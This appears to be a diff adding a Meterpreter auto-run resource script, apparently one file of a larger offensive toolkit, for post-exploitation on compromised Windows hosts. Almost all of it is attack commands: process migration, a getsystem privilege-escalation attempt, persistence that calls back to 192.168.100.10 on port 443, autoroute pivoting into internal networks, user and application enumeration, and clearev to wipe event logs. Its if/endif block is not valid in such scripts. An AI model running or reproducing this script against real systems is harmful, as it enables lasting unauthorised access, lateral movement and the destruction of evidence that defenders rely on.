@@ -1,0 +1,41 @@
+
+## 📄 FILE 6: scripts/persistence/autorun.rc
+
+```bash
+# Meterpreter Auto-Run Script for Persistence
+# Usage: set AutoRunScript persistence/autorun.rc
+
+# Migrate to stable process first
+post/windows/manage/migrate
+
+# Wait for migration
+sleep 5
+
+# Get system info
+sysinfo
+
+# Check privileges and attempt escalation
+getuid
+getprivs
+
+# If not SYSTEM, try to elevate
+if getuid != "NT AUTHORITY\\SYSTEM"
+    getsystem
+endif
+
+# Setup basic persistence
+run persistence -X -i 60 -p 443 -r 192.168.100.10
+
+# Setup autoroute for internal networks
+run autoroute -s 192.168.100.0/24
+run autoroute -s 10.0.0.0/8
+
+# Basic enumeration
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_applications
+
+# Cleanup event logs
+clearev
+
+# Notify completion
+echo "[+] Auto-run script completed successfully"
